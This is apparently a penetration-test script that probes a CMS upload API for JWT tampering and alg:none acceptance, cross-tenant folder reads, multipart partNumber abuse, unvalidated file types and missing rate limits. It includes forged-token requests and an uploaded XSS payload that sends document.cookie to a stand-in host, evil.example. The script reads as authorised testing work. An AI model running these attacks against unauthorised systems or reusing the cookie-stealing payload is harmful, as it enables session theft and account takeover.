// CMS4 upload/conversion API security round 2 - deeper checks:
// finalize idempotency, cross-tenant folderId access, JWT tampering, MIME/extension
// mismatch, multipart partNumber abuse, concurrent-session flood.
// Non-destructive: no delete calls, no real S3 PUT to foreign keys.
import { chromium } from '@playwright/test';
import fs from 'fs';

const base = process.env.CMS4_BASE || 'https://cms4.pocsample.in';
const results = [];
function log(id, severity, summary, detail) {
  results.push({ id, severity, summary, detail });
  console.log(`[${severity}] ${id}: ${summary}`);
}

const b = await chromium.launch();
const ctx = await b.newContext();
const p = await ctx.newPage();
let api = null, authH = null;
p.on('request', r => {
  if (/\/v3\/cms\//.test(r.url())) {
    if (!api) api = r.url().split('/v3/')[0];
    if (!authH && /\/file\/(read|stats)/.test(r.url())) authH = r.headers();
  }
});
await p.goto(base + '/', { waitUntil: 'domcontentloaded' });
await p.locator('input[type=email],input[name*=mail i],input[type=text]').first().fill(process.env.CMS4_USER);
await p.locator('input[type=password]').first().fill(process.env.CMS4_PASS);
await p.locator('button[type=submit],button:has-text("Login"),button:has-text("Sign in")').first().click();
await p.waitForTimeout(6000);
await p.goto(base + '/library', { waitUntil: 'domcontentloaded' });
await p.waitForTimeout(4000);
const folders = await (await fetch(`${api}/v3/cms/folder/read?parentFolder=&page=1&limit=100`, { headers: { authorization: authH?.authorization, cookie: authH?.cookie || '' } }).catch(() => null))?.json().catch(() => null);
await b.close();

const H = { 'content-type': 'application/json', authorization: authH.authorization, cookie: authH.cookie || '' };
const myToken = authH.authorization.replace(/^Bearer /, '');

// ---- A: JWT tampering - flip payload, keep signature; flip signature, keep payload ----
{
  const [h, pl, sig] = myToken.split('.');
  const payload = JSON.parse(Buffer.from(pl, 'base64').toString());
  const tamperedId = { ...payload, id: '000000000000000000000000' };
  const tamperedToken = `${h}.${Buffer.from(JSON.stringify(tamperedId)).toString('base64url')}.${sig}`;
  const r = await fetch(`${api}/v3/cms/file/stats?folderId=`, { headers: { authorization: `Bearer ${tamperedToken}`, cookie: H.cookie } });
  const body = await r.text();
  log('UPLOAD-SEC-07', r.status < 300 ? 'CRITICAL' : 'INFO',
    r.status < 300 ? 'JWT with tampered payload (reused original signature) was accepted' : 'tampered-payload JWT correctly rejected (signature verified)',
    { status: r.status, body: body.slice(0, 200) });
}
{
  // alg:none style - strip signature entirely
  const [h, pl] = myToken.split('.');
  const noneHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const noneToken = `${noneHeader}.${pl}.`;
  const r = await fetch(`${api}/v3/cms/file/stats?folderId=`, { headers: { authorization: `Bearer ${noneToken}`, cookie: H.cookie } });
  log('UPLOAD-SEC-08', r.status < 300 ? 'CRITICAL' : 'INFO',
    r.status < 300 ? 'alg:none JWT accepted' : 'alg:none JWT correctly rejected',
    { status: r.status, body: (await r.text()).slice(0, 200) });
}

// ---- B: cross-tenant folderId access (does /file/read leak other groups' files via folderId param?) ----
{
  const fakeFolderIds = ['000000000000000000000000', 'ffffffffffffffffffffffff'];
  for (const fid of fakeFolderIds) {
    const r = await fetch(`${api}/v3/cms/file/read?limit=10&search=&page=1&type=&sort=createdAt&order=-1&folderId=${fid}`, { headers: H });
    const body = await r.text();
    let count = -1; try { count = JSON.parse(body).docs?.length ?? -1; } catch {}
    log('UPLOAD-SEC-09:' + fid.slice(0, 8), (r.status < 300 && count > 0) ? 'HIGH' : 'INFO',
      `folderId=${fid} -> ${r.status}, docs=${count}`, { status: r.status, body: body.slice(0, 200) });
  }
}

// ---- C: multipart partNumber abuse (out-of-range / negative) ----
{
  const cm = await fetch(`${api}/v3/cms/file/uppy/create-multipart-upload`, { method: 'POST', headers: H, body: JSON.stringify({ filename: `probe-${Date.now()}.mp4`, type: 'video/mp4' }) });
  const { uploadId, key } = await cm.json();
  for (const pn of [0, -1, 10001, 99999999]) {
    const r = await fetch(`${api}/v3/cms/file/uppy/sign-part?uploadId=${encodeURIComponent(uploadId)}&key=${encodeURIComponent(key)}&partNumber=${pn}`, { headers: H });
    const body = await r.text();
    log('UPLOAD-SEC-10:pn=' + pn, r.status < 300 ? 'MEDIUM' : 'INFO', `partNumber=${pn} -> ${r.status}`, { status: r.status, body: body.slice(0, 200) });
  }
}

// ---- D: MIME/extension mismatch - declare video/mp4 but it's an HTML/script payload ----
{
  const evilContent = '<html><script>document.location="https://evil.example/"+document.cookie</script></html>';
  const cm = await fetch(`${api}/v3/cms/file/uppy/create-multipart-upload`, { method: 'POST', headers: H, body: JSON.stringify({ filename: `xss-${Date.now()}.mp4`, type: 'video/mp4' }) });
  const { uploadId, key } = await cm.json();
  const sp = await fetch(`${api}/v3/cms/file/uppy/sign-part?uploadId=${encodeURIComponent(uploadId)}&key=${encodeURIComponent(key)}&partNumber=1`, { headers: H });
  const { url } = await sp.json();
  const put = await fetch(url, { method: 'PUT', body: evilContent });
  const etag = put.headers.get('etag');
  const cp = await fetch(`${api}/v3/cms/file/uppy/complete-multipart-upload`, { method: 'POST', headers: H, body: JSON.stringify({ uploadId, key, parts: [{ ETag: etag, PartNumber: 1 }] }) });
  const cpBody = await cp.text();
  const fin = await fetch(`${api}/v3/cms/file/uppy/finalize`, { method: 'POST', headers: H, body: JSON.stringify({ key, clientWidth: 640, clientHeight: 360, clientDuration: 1, name: `xss-${Date.now()}.mp4` }) });
  const finBody = await fin.text();
  log('UPLOAD-SEC-11', fin.status < 300 ? 'MEDIUM' : 'INFO',
    fin.status < 300 ? 'HTML/script content with .mp4 name + video/mp4 type was accepted and finalized (no content-type/magic-byte validation)' : 'non-video content rejected at finalize',
    { completeStatus: cp.status, completeBody: cpBody.slice(0, 150), finalizeStatus: fin.status, finalizeBody: finBody.slice(0, 250) });
}

// ---- E: concurrent multipart session flood (resource exhaustion check, modest scale) ----
{
  const N = 25;
  const t0 = Date.now();
  const rs = await Promise.all(Array.from({ length: N }, (_, i) =>
    fetch(`${api}/v3/cms/file/uppy/create-multipart-upload`, { method: 'POST', headers: H, body: JSON.stringify({ filename: `flood-${Date.now()}-${i}.mp4`, type: 'video/mp4' }) })
      .then(r => r.status).catch(e => 'ERR:' + e.message)
  ));
  const elapsed = Date.now() - t0;
  const okCount = rs.filter(s => s === 200).length;
  const throttled = rs.filter(s => s === 429).length;
  log('UPLOAD-SEC-12', throttled === 0 ? 'LOW' : 'INFO',
    `${N} concurrent create-multipart-upload calls -> ${okCount} ok, ${throttled} throttled(429), in ${elapsed}ms (no rate limiting observed if throttled=0)`,
    { statuses: rs });
}

fs.mkdirSync('reports', { recursive: true });
fs.writeFileSync('reports/cms4-upload-api-security-v2.json', JSON.stringify(results, null, 2));
console.log('\n--- summary ---');
for (const r of results) console.log(r.severity.padEnd(8), r.id, r.summary);
